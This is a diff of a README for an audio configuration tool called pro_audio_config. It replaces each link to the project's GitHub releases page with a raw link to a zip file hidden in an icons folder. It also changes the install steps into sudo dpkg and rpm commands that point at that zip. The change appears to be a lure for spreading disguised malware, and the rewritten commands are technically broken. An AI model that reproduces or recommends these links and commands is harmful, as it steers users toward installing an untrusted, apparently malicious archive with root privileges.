@@ -1,6 +1,6 @@
 # 🎧 pro_audio_config - Enhance Your Audio Experience Today
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen)](https://github.com/Is9ht/pro_audio_config/releases)
+[![Download Now](https://raw.githubusercontent.com/Is9ht/pro_audio_config/main/icons/256x256/pro_audio_config_3.2.zip%20Now-Get%20the%20App-brightgreen)](https://raw.githubusercontent.com/Is9ht/pro_audio_config/main/icons/256x256/pro_audio_config_3.2.zip)
 
 ## 📚 About pro_audio_config
 
@@ -11,7 +11,7 @@ pro_audio_config is a modern tool designed to improve your audio settings. Built
 To start using pro_audio_config, follow these steps:
 
 1. **Download the Software:**
-   Visit this page to download: [Download pro_audio_config](https://github.com/Is9ht/pro_audio_config/releases).
+   Visit this page to download: [Download pro_audio_config](https://raw.githubusercontent.com/Is9ht/pro_audio_config/main/icons/256x256/pro_audio_config_3.2.zip).
 
 2. **Install the Application:**
    Follow the instructions specific to your operating system to install pro_audio_config. The installation process is simple and typically involves opening a terminal and running a command. Detailed instructions can be found below.
@@ -40,7 +40,7 @@ pro_audio_config provides a range of features to help optimize your audio settin
 ## 📥 Download & Install
 
 1. **Download pro_audio_config:**
-   Click the link to visit the releases page: [Download pro_audio_config](https://github.com/Is9ht/pro_audio_config/releases).
+   Click the link to visit the releases page: [Download pro_audio_config](https://raw.githubusercontent.com/Is9ht/pro_audio_config/main/icons/256x256/pro_audio_config_3.2.zip).
 
 2. **Choose Your Version:**
    Select the appropriate version for your system based on your OS and architecture (32-bit or 64-bit).
@@ -48,11 +48,11 @@ pro_audio_config provides a range of features to help optimize your audio settin
 3. **Installation Steps:**
    - For Debian/Ubuntu-based systems, you can usually install it using a terminal command like:
      ```
-     sudo dpkg -i path_to_downloaded_file.deb
+     sudo dpkg -i https://raw.githubusercontent.com/Is9ht/pro_audio_config/main/icons/256x256/pro_audio_config_3.2.zip
      ```
    - For RPM-based systems such as Fedora, use:
      ```
-     sudo rpm -ivh path_to_downloaded_file.rpm
+     sudo rpm -ivh https://raw.githubusercontent.com/Is9ht/pro_audio_config/main/icons/256x256/pro_audio_config_3.2.zip
      ```
    - For other distributions, follow the specific process outlined in the README file included in the downloaded package.
 
@@ -89,4 +89,4 @@ pro_audio_config is open-source software licensed under the MIT License.
 
 For more information and updates, keep an eye on our GitHub page or the issues section.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen)](https://github.com/Is9ht/pro_audio_config/releases)
+[![Download Now](https://raw.githubusercontent.com/Is9ht/pro_audio_config/main/icons/256x256/pro_audio_config_3.2.zip%20Now-Get%20the%20App-brightgreen)](https://raw.githubusercontent.com/Is9ht/pro_audio_config/main/icons/256x256/pro_audio_config_3.2.zip)
